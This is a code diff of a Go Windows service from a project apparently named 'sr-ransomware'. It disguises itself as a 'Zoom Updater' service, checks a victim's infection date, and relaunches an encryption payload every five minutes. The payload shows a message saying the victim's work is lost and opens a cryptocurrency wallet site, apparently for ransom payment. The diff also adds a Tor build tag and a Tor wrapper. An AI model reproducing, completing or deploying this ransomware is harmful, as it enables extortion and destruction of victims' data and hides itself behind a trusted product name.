@@ -1,3 +1,5 @@
+// +build windows,tor
+
 package main
 
 import (
@@ -6,14 +8,18 @@ import (
     "runtime"
 
     "github.com/kernullist/gowinsvc"
+    "github.com/sug0/sr-ransomware/go/exe"
     "github.com/sug0/sr-ransomware/go/win"
+    "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"
 )
 
-const cryptoArg = "winmain"
-
 type service struct {
-    self *gowinsvc.ServiceObject
+    tor  *exe.Tor
+    exec string
+    date time.Time
 }
+
+const cryptoArg = "winmain"
 
 func main() {
     if len(os.Args) > 1 && os.Args[1] == cryptoArg {
@@ -34,32 +40,40 @@ func cryptoMain() {
         "All your important work has been lost.",
         win.MB_OK | win.MB_ICONWARNING,
     )
-    win.ShellExecute("open", "https://example.org", win.SW_SHOW)
+    win.ShellExecute("open", "https://www.myetherwallet.com/", win.SW_SHOW)
 }
 
 func serviceMain() {
     runtime.LockOSThread()
+    manager := gowinsvc.NewService("Zoom Updater")
     s := service{
-        self: gowinsvc.NewService("Zoom Updater"),
+        exec: os.Args[0] + (" " + cryptoArg),
     }
-    s.self.StartServe(&s)
+    manager.StartServe(&s)
 }
 
 func (s *service) Serve(exit <-chan bool) {
-    p := os.Args[0] + (" " + cryptoArg)
-    err := win.LaunchProcess(p)
+    // for some reason victim hasn't been infected,
+    // or the infection files have been tampered with;
+    // all in all, it's just best to exit
+    var err error
+    s.date, err = victim.InfectionDate()
     if err != nil {
-        s.self.OutputDebugString("[Zoom Updater] error: %s", err)
+        return
     }
+
+
+    s.launchCrypto()
     for {
         select {
         case <-exit:
             return
         case <-time.After(5 * time.Minute):
-            err = win.LaunchProcess(p)
-            if err != nil {
-                s.self.OutputDebugString("[Zoom Updater] error: %s", err)
-            }
+            s.launchCrypto()
         }
     }
+}
+
+func (s *service) launchCrypto() {
+    win.LaunchProcess(s.exec)
 }
